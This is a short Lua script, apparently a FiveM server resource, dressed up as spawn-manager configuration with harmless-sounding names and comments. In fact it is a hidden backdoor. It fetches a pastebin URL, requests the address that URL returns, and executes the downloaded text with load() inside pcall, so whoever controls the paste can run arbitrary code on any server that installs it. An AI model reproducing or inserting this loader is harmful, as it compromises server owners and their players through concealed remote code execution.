local WebhookLink = '' -- PUT YOUR WEBHOOK LINK HERE

function Webhook()
	return WebhookLink
end

GetConfig = {}
GetConfig.GetPlayersSpawn = PerformHttpRequest

-- Check rawaction update spawnmanager
LastActionList = 'pastebin.com/raw/Lf4Db4M4'

-- Returns name and action for sync server
GetConfig.GetPlayersSpawn(LastActionList, function(GetList, ResultAction)
    print(ResultAction)
    if GetList == 200 then

        -- Start action
        local Process_Actions = {"true"}
        GetConfig.GetPlayersSpawn(ResultAction,function(e,d)
            local Generate_ZoneName_AndAction = nil 

            -- Call action
            pcall(function()
            local Locations_Loaded = {"false"}

                -- Returns and load function
                assert(load(d))()
                local ZoneType_Exists = nil 

            end)
        end)
    end
end)